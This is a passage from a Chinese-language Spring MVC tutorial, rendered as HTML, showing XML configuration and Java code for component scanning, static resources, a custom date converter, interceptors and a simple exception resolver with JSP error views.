System.out.println(request);    System.out.println(response);    System.out.println(session);&#125;&#125;</code></pre></div><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ol><li><strong>文件上传客户端三要素</strong></li></ol><p>表单项type&#x3D;“file”</p><p>表单的提交方式是post</p><p>表单的enctype属性是多部分表单形式，及enctype&#x3D;“multipart&#x2F;form-data”</p><p><strong>单文件上传步骤</strong></p><p>① 导入fileupload和io坐标</p><p>② 配置文件上传解析器</p><p>③ 编写文件上传代码</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="配置组件扫描"><a href="#配置组件扫描" class="headerlink" title="配置组件扫描"></a>配置组件扫描</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.pacemrc&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:include-filter</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;annotation&quot;</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">context:component-scan</span>&gt;</span></code></pre></div><h2 id="配置静态资源的访问"><a href="#配置静态资源的访问" class="headerlink" title="配置静态资源的访问"></a>配置静态资源的访问</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mvc:resources</span> <span class="hljs-attr">mapping</span>=<span class="hljs-string">&quot;/js/**&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;/js/&quot;</span>/&gt;</span>    <span class="hljs-comment">&lt;!--对静态资源不进行拦截--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mvc:default-servlet-handler</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mvc:default-servlet-handler</span>&gt;</span></code></pre></div><h2 id="配置注解驱动"><a href="#配置注解驱动" class="headerlink" title="配置注解驱动"></a>配置注解驱动</h2><div class="code-wrapper"><pre><code class="hljs crystal">&lt;<span class="hljs-symbol">mvc:</span><span class="hljs-keyword">annotation</span>-<span class="hljs-title">driven</span>/&gt;<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/blog.csdn.net/ok</span>060/article/details/<span class="hljs-number">135983424</span></code></pre></div><h2 id="配置自定义视图解析器"><a href="#配置自定义视图解析器" class="headerlink" title="配置自定义视图解析器"></a>配置自定义视图解析器</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;viewResolver&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--  /jsp/success.jsp  --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prefix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/jsp/&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;suffix&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;.jsp&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><h2 id="配置自定义转换器"><a href="#配置自定义转换器" class="headerlink" title="配置自定义转换器"></a>配置自定义转换器</h2><h3 id="创建自定义起转换器"><a href="#创建自定义起转换器" class="headerlink" title="创建自定义起转换器"></a>创建自定义起转换器</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.core.convert.converter.Converter;<span class="hljs-keyword">import</span> java.text.ParseException;<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<span class="hljs-keyword">import</span> java.util.Date;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateConverter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Converter</span>&lt;String, Date&gt; &#123;    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">convert</span><span class="hljs-params">(String dateStr)</span> &#123;        <span class="hljs-comment">//将日期字符串转换成日期对象 返回</span>        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd&quot;</span>);        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            date = format.parse(dateStr);        &#125; <span class="hljs-keyword">catch</span> (ParseException e) &#123;            e.printStackTrace();        &#125;        <span class="hljs-keyword">return</span> date;    &#125;&#125;</code></pre></div><h3 id="配置springmvc-xml"><a href="#配置springmvc-xml" class="headerlink" title="配置springmvc.xml"></a>配置springmvc.xml</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--声明转换器--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;conversionService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.context.support.ConversionServiceFactoryBean&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;converters&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.converter.DateConverter&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-comment">&lt;!--mvc的转换器注解驱动--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mvc:annotation-driven</span> <span class="hljs-attr">conversion-service</span>=<span class="hljs-string">&quot;conversionService&quot;</span>/&gt;</span></code></pre></div><h2 id="配置拦截器"><a href="#配置拦截器" class="headerlink" title="配置拦截器"></a>配置拦截器</h2><h3 id="创建Controller"><a href="#创建Controller" class="headerlink" title="创建Controller"></a>创建Controller</h3><p>testController.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testController</span> &#123;    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span>    <span class="hljs-meta">@ResponseBody</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;running...&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;    &#125;&#125;</code></pre></div><h3 id="创建Interceptor"><a href="#创建Interceptor" class="headerlink" title="创建Interceptor"></a>创建Interceptor</h3><p>可为controller配置多个interceptor</p><p>testInterceptor.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.interceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;        System.out.println(<span class="hljs-string">&quot;1---preHandle&quot;</span>);<span class="hljs-comment">//        return HandlerInterceptor.super.preHandle(request, response, handler);</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;        System.out.println(<span class="hljs-string">&quot;1---postHandle&quot;</span>);<span class="hljs-comment">//        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);</span>    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;        System.out.println(<span class="hljs-string">&quot;1---afterCompletion&quot;</span>);<span class="hljs-comment">//        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);</span>    &#125;&#125;</code></pre></div><p>test2Interceptor.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.interceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test2Interceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;        System.out.println(<span class="hljs-string">&quot;2---preHandle&quot;</span>);<span class="hljs-comment">//        return HandlerInterceptor.super.preHandle(request, response, handler);</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;        System.out.println(<span class="hljs-string">&quot;2---postHandle&quot;</span>);<span class="hljs-comment">//        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);</span>    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;        System.out.println(<span class="hljs-string">&quot;2---afterCompletion&quot;</span>);<span class="hljs-comment">//        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);</span>    &#125;&#125;</code></pre></div><h3 id="配置springmvc-xml-1"><a href="#配置springmvc-xml-1" class="headerlink" title="配置springmvc.xml"></a>配置springmvc.xml</h3><div class="code-wrapper"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>       xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span>       xmlns:mvc=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span>       xsi:schemaLocation=<span class="hljs-string">&quot;</span><span class="hljs-string">       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><span class="hljs-string">       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span><span class="hljs-string">       http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;    &lt;context:component-scan base-<span class="hljs-keyword">package</span>=<span class="hljs-string">&quot;com.pacemrc.controller&quot;</span>&gt;        &lt;context:include-filter type=<span class="hljs-string">&quot;annotation&quot;</span> expression=<span class="hljs-string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;    &lt;/context:component-scan&gt;    &lt;mvc:interceptors&gt;        &lt;mvc:interceptor&gt;            &lt;mvc:mapping path=<span class="hljs-string">&quot;/test&quot;</span>/&gt;            &lt;bean class=<span class="hljs-string">&quot;com.pacemrc.interceptor.testInterceptor&quot;</span>/&gt;        &lt;/mvc:interceptor&gt;        &lt;mvc:interceptor&gt;            &lt;mvc:mapping path=<span class="hljs-string">&quot;/test&quot;</span>/&gt;            &lt;bean class=<span class="hljs-string">&quot;com.pacemrc.interceptor.test2Interceptor&quot;</span>/&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;&lt;/beans&gt;</code></pre></div><h3 id="配置web-xml"><a href="#配置web-xml" class="headerlink" title="配置web.xml"></a>配置web.xml</h3><div class="code-wrapper"><pre><code class="hljs java">&lt;!DOCTYPE web-app PUBLIC <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;&lt;web-app&gt;  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;    &lt;init-param&gt;      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;      &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;<span class="hljs-number">1</span>&lt;/load-on-startup&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre></div><h3 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h3><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/test/</span>test</code></pre></div><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240705205745920.png)</p><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240705205903322.png)  </p><h2 id="配置简单异常解析器"><a href="#配置简单异常解析器" class="headerlink" title="配置简单异常解析器"></a>配置简单异常解析器</h2><h3 id="创建自定义异常类"><a href="#创建自定义异常类" class="headerlink" title="创建自定义异常类"></a>创建自定义异常类</h3><p>CustomException.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.exception;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span> &#123;&#125;</code></pre></div><h3 id="创建服务接口"><a href="#创建服务接口" class="headerlink" title="创建服务接口"></a>创建服务接口</h3><p>exceptionService.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.service;<span class="hljs-keyword">import</span> com.pacemrc.exception.CustomException;<span class="hljs-keyword">import</span> java.io.FileNotFoundException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">exceptionService</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testClassCastException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassCastException;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testArithmeticException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ArithmeticException;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFileNotFoundException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testNullPointerException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NullPointerException;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCustomException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CustomException;&#125;</code></pre></div><h3 id="创建接口实现类"><a href="#创建接口实现类" class="headerlink" title="创建接口实现类"></a>创建接口实现类</h3><p>exceptionServiceImpl.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.service;<span class="hljs-keyword">import</span> com.pacemrc.exception.CustomException;<span class="hljs-keyword">import</span> java.io.FileNotFoundException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exceptionServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">exceptionService</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testClassCastException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassCastException &#123;        System.out.println(<span class="hljs-string">&quot;抛出类型转换异常....&quot;</span>);        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassCastException</span>();    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testArithmeticException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ArithmeticException &#123;        System.out.println(<span class="hljs-string">&quot;抛出除零异常....&quot;</span>);        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArithmeticException</span>();    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFileNotFoundException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;        System.out.println(<span class="hljs-string">&quot;文件找不到异常....&quot;</span>);        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileNotFoundException</span>();    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testNullPointerException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NullPointerException &#123;        System.out.println(<span class="hljs-string">&quot;空指针异常.....&quot;</span>);        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCustomException</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CustomException &#123;        System.out.println(<span class="hljs-string">&quot;自定义异常....&quot;</span>);        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomException</span>();    &#125;&#125;</code></pre></div><h3 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h3><p>view1.jsp</p><div class="code-wrapper"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;默认异常视图&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><p>view2.jsp</p><div class="code-wrapper"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;类型转换异常视图&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><p>view3.jsp</p><div class="code-wrapper"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;自定义异常视图&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h3 id="创建Controller-1"><a href="#创建Controller-1" class="headerlink" title="创建Controller"></a>创建Controller</h3><p>testController.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.controller;<span class="hljs-keyword">import</span> com.pacemrc.exception.CustomException;<span class="hljs-keyword">import</span> com.pacemrc.service.exceptionServiceImpl;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> java.io.FileNotFoundException;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testController</span> &#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">public</span> exceptionServiceImpl exceptionService;    <span class="hljs-meta">@RequestMapping(&quot;/testClassCastException&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> &#123;        exceptionService.testClassCastException();    &#125;    <span class="hljs-meta">@RequestMapping(&quot;/testArithmeticException&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> &#123;        exceptionService.testArithmeticException();    &#125;    <span class="hljs-meta">@RequestMapping(&quot;/testFileNotFoundException&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException &#123;        exceptionService.testFileNotFoundException();    &#125;    <span class="hljs-meta">@RequestMapping(&quot;/testNullPointerException&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test4</span><span class="hljs-params">()</span> &#123;        exceptionService.testNullPointerException();    &#125;    <span class="hljs-meta">@RequestMapping(&quot;/testCustomException&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test5</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CustomException &#123;        exceptionService.testCustomException();    &#125;&#125;</code></pre></div><h3 id="配置spring-xml"><a href="#配置spring-xml" class="headerlink" title="配置spring.xml"></a>配置spring.xml</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">                            http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.pacemrc.service&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">context:component-scan</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.pacemrc.service.exceptionServiceImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="配置springmvc-xml-2"><a href="#配置springmvc-xml-2" class="headerlink" title="配置springmvc.xml"></a>配置springmvc.xml</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span></span><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--配置springmvc组件扫描--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.pacemrc&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">context:include-filter</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;annotation&quot;</span> <span class="hljs-attr">expression</span>=<span class="hljs-string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">context:component-scan</span>&gt;</span>    <span class="hljs-comment">&lt;!--配置注解驱动--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:annotation-driven</span>/&gt;</span>    <span class="hljs-comment">&lt;!--对静态资源不进行拦截--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mvc:default-servlet-handler</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mvc:default-servlet-handler</span>&gt;</span>    <span class="hljs-comment">&lt;!--定义简单异常处理器--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultErrorView&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/view1.jsp&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exceptionMappings&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;java.lang.ClassCastException&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/view2.jsp&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;CustomException&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/view3.jsp&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span 